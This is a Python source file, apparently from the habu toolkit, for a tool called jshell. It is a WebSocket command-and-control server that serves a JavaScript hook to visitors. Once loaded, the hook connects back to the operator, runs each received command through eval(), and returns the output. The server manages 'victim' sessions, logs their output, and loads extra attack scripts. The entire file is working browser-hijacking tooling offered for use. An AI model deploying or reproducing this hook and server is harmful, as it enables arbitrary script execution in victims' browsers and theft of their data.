#!/usr/bin/env python3

import asyncio
import json
import threading
from datetime import datetime
from http import HTTPStatus
from pathlib import Path
from pprint import pprint
from queue import Queue

import click
import websockets
from prompt_toolkit.contrib.completers import WordCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.layout.lexers import PygmentsLexer
from prompt_toolkit.shortcuts import prompt
from pygments.lexers import JavascriptLexer

from habu.config import config
from habu.lib.completeme.javascript import javascript as completer_list


hook_js = '''
endpoint = "ws://{ip}:{port}";

socket = new WebSocket(endpoint);

socket.onmessage = function(event){{
    try {{
        out = eval(event.data);
        socket.send(out);
    }}
    catch(err) {{
        socket.send(err);
    }};
}};
'''


class MyWebSocketServerProtocol(websockets.server.WebSocketServerProtocol):
    ''' This returns the hook.js file if the requests is not a WebSocket request '''

    @asyncio.coroutine
    def process_request(self, path, request_headers):
        if 'Upgrade' in request_headers.keys():
            return None

        print('>>> HTTP Request received from {}. Sending hookjs'.format(self.remote_address[0]))

        if path.endswith('.js'):
            response_headers = [
                ('Content-Lenght', len(hook_js)),
                ('Content-type', 'application/javascript'),
            ]
            return (HTTPStatus.OK, response_headers, hook_js.encode())

        document = '<html><body><script>' + hook_js + '</script></body></html>'

        response_headers = [
            ('Content-Lenght', len(document)),
            ('Content-type', 'text/html'),
        ]

        return (HTTPStatus.OK, response_headers, document.encode())


class Runner():

    def __init__(self):

        self.internal_commands = {
            '_close': ('Closes the websocket', self.cmd_close),
            '_help' : ('Show this help', self.cmd_help),
            '_sessions' : ('List active sessions', self.cmd_sessions),
            '_channel' : ('Print channel log', self.cmd_channel),
            '_active' : ('Set active session (param: session_id)', self.cmd_active),
            '_websocket': ('Show websocket info', self.cmd_websocket),
        }

        self.get_external_commands()
        self.active = None
        self.sessions = {}


    def addifnew(self, websocket):
        for s in self.sessions.values():
            if s['websocket'] == websocket:
                return False

        if len(self.sessions) == 0:
            session_id = '0'
        else:
            session_id = str(int(sorted(self.sessions.keys(), reverse=True)[0]) + 1)
        self.sessions[session_id] = {
            'name': '{}:{} {}'.format(
                websocket.remote_address[0],
                websocket.remote_address[1],
                websocket.request_headers.get('User-Agent', 'No User Agent?'),
            ),
            'websocket': websocket,
        }

        print(">>> Connection from {}".format(websocket.remote_address[0]))
        return True


    def get_external_commands(self):

        self.external_commands = {}

        for f in (config['DATADIR'] / 'jshell-commands').glob('*.js'):
            with f.open() as cmd_file:
                cmd_name = '_' + f.stem
                cmd_help = cmd_file.readline().replace('//', '').strip()
                cmd_content = cmd_file.read()

            self.external_commands[cmd_name] = (cmd_help, cmd_content)


    def cmd_close(self):
        print(">>> Closing connection")
        for i in list(self.sessions):
            if self.sessions[i]['websocket'] == self.active:
                del self.sessions[i]
        self.active = None


    def cmd_sessions(self):
        for i,s in self.sessions.items():
            if self.active == s:
                print('{} * {}'.format(i, s['name']))
            else:
                print('{}   {}'.format(i, s['name']))
        return True


    def cmd_channel(self):
        outfile = Path('session-{}-{}.txt'.format(self.active['websocket'].remote_address[0], self.active['websocket'].remote_address[1]))
        if outfile.is_file():
            with outfile.open() as of:
                print(of.read(), '\n')
        else:
            print('No channel log yet')


    def cmd_websocket(self):
        pprint(dir(self.active['websocket']))
        pprint(self.active['websocket'])
        pprint(self.active['websocket'].request_headers)
        pprint(dir(self.active['websocket'].request_headers))
        pprint(self.active['websocket'].request_headers.get('User-Agent', 'No User Agent?'))

        return True


    def cmd_active(self, i):
        i = str(i)
        session = self.sessions.get(i, None)
        if session:
            if session['websocket'].open:
                self.active = session
            else:
                print('Session is closed')
                del self.sessions[i]
        else:
            print('Invalid session id')


    def cmd_help(self):
        print('\nInternal Commands ================================')
        for cmd_name in self.internal_commands.keys():
            print('{:<20} {}'.format(cmd_name, self.internal_commands[cmd_name][0]))

        print('\nExternal Commands ================================')
        for cmd_name in self.external_commands.keys():
            print('{:<20} {}'.format(cmd_name, self.external_commands[cmd_name][0]))


    async def send(self, command):
        await self.active['websocket'].send(command)

    async def run(self, command):

        if not self.sessions:
            print('No sessions')
            return False

        if not self.active:
            for s in self.sessions.values():
                self.active = s
                break

        if not command.startswith('_'):
            await self.send(command)
            return True

        if ' ' in command:
            arg = command.split(' ')[1]
            command = command.split(' ')[0]
        else:
            arg = None

        if command in self.internal_commands.keys():
            if arg:
                try:
                    self.internal_commands[command][1](arg)
                except Exception as e:
                    print(e)
            else:
                try:
                    self.internal_commands[command][1]()
                except Exception as e:
                    print(e)
        elif command in self.external_commands.keys():
            await self.send(self.external_commands[command][1])
        else:
            print('>>> Invalid command')
        return True


runner = Runner()
queue = Queue()


async def sender_handler(websocket):
    runner.addifnew(websocket)

    while True:

        if queue.empty():
            await asyncio.sleep(1)
            continue

        command = queue.get()
        try:
            await runner.run(command)
        except websockets.exceptions.ConnectionClosed:
            print('>>> Connection lost.')


async def consumer(websocket, message):
    if message.startswith('@##@'):
        message = message.replace('@##@', '').strip()
        outfile = Path('session-{}-{}.txt'.format(websocket.remote_address[0], websocket.remote_address[1]))
        if not outfile.is_file():
            header = '{} - {}:{} - {}\n'.format(
                datetime.now(),
                websocket.remote_address[0],
                websocket.remote_address[1],
                websocket.request_headers.get('User-Agent', 'No-User-Agent')
            )
            message = header + message

        with outfile.open('a') as of:
            of.write(message)
    else:
        try:
            j = json.loads(message)
            print(json.dumps(j, indent=4))
        except ValueError:
            print(message)


async def receiver_handler(websocket):
    runner.addifnew(websocket)

    # The commented only works with python3-websockets 4.x
    '''
    async for message in websocket:
        await consumer(websocket, message)
    '''

    while True:
        message = await websocket.recv()
        await consumer(websocket, message)


async def handler(websocket, path):
    sender_task = asyncio.ensure_future(sender_handler(websocket))
    receiver_task = asyncio.ensure_future(receiver_handler(websocket))
    done, pending = await asyncio.wait(
        [sender_task, receiver_task],
        return_when=asyncio.FIRST_COMPLETED,
    )


@click.command()
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
@click.option('-i', 'ip', default='127.0.0.1', help='IP to listen on')
@click.option('-p', 'port', default=3333, help='Port to listen on')
def cmd_jshell(ip, port, verbose):

    global hook_js
    hook_js = hook_js.format(ip=ip, port=port)

    print('>>> Listening on {}:{}. Waiting for a victim connection.'.format(ip, port))

    eventloop = asyncio.get_event_loop()
    eventloop.run_until_complete(websockets.serve(handler, ip, port, create_protocol=MyWebSocketServerProtocol))

    thread = threading.Thread(target=eventloop.run_forever)
    thread.start()

    completer = WordCompleter(completer_list + list(runner.internal_commands) + list(runner.external_commands))
    history = InMemoryHistory()

    while True:
        if not thread.is_alive():
            break

        cmd = prompt('$ ', patch_stdout=True, completer=completer, history=history, lexer=PygmentsLexer(JavascriptLexer))
        if cmd:
            if cmd == '_help':
                runner.cmd_help()
            elif runner.sessions:
                queue.put_nowait(cmd)
            else:
                print('>>> No active session!')


if __name__ == '__main__':
    cmd_jshell()
